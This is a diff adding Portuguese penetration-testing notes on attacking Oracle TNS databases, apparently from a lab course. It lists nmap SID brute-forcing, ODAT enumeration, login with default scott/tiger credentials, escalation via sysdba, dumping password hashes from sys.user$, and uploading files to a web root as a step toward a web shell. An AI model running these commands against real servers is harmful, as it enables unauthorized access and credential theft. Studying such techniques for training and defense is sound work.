@@ -328,7 +328,29 @@ O Oracle Transparent Network Substrate (TNS) server é um protocolo de comunica�
 - Por padrão, o ouvinte escuta as conexões de entrada na porta TCP/1521
 - Os arquivos de configuração do Oracle TNS são chamados tnsnames.ora e listener.ora e normalmente estão localizados no $ORACLE_HOME/network/admin diretório.
 - O Oracle 9 tem uma senha padrão, CHANGE_ON_INSTALL
-- odat.py para enumerar
+- Ferramenta de ataque ao banco de dados Oracle (ODAT) é uma ferramenta de teste de penetração de código aberto escrita em Python e projetada para enumerar e explorar vulnerabilidades em bancos de dados Oracle. Ele pode ser usado para identificar e explorar várias falhas de segurança em bancos de dados Oracle, incluindo injeção de SQL, execução remota de código e escalonamento de privilégios.
+- nmap -p1521 -sV 10.129.204.235 --open
+- nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+- ./odat.py all -s 10.129.204.235
+- podemos usar a ferramenta sqlplus para se conectar ao banco de dados Oracle e interagir com ele.
+- sqlplus scott/tiger@10.129.204.235/XE
+- Se você se deparar com o seguinte erro sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, por favor execute o abaixo,
+- sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
+- select table_name from all_tables;
+- select * from user_role_privs;
+- sqlplus scott/tiger@10.129.204.235/XE as sysdba -> tentar escalar user normal logado para root
+
+Podemos seguir muitas abordagens quando tivermos acesso a um banco de dados Oracle. Depende muito das informações que temos e de toda a configuração. No entanto, não podemos adicionar novos usuários nem fazer modificações. A partir deste ponto, poderíamos recuperar os hashes de senha do sys.user$ e tente quebrá-los offline. A consulta para isso seria semelhante à seguinte:
+
+- select name, password from sys.user$;
+
+Outra opção é fazer upload de um shell da web para o destino. No entanto, isso requer que o servidor execute um servidor web, e precisamos saber a localização exata do diretório raiz do servidor web. No entanto, se soubermos com que tipo de sistema estamos lidando, podemos tentar os caminhos padrão, que são: </br>
+Linux	/var/www/html </br>
+Windows	C:\inetpub\wwwroot </br>
+
+- echo "Oracle File Upload Test" > testing.txt
+- ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+- curl -X GET http://10.129.204.235/testing.txt
 
 ## 🧰 Extras e Ferramentas Úteis
 
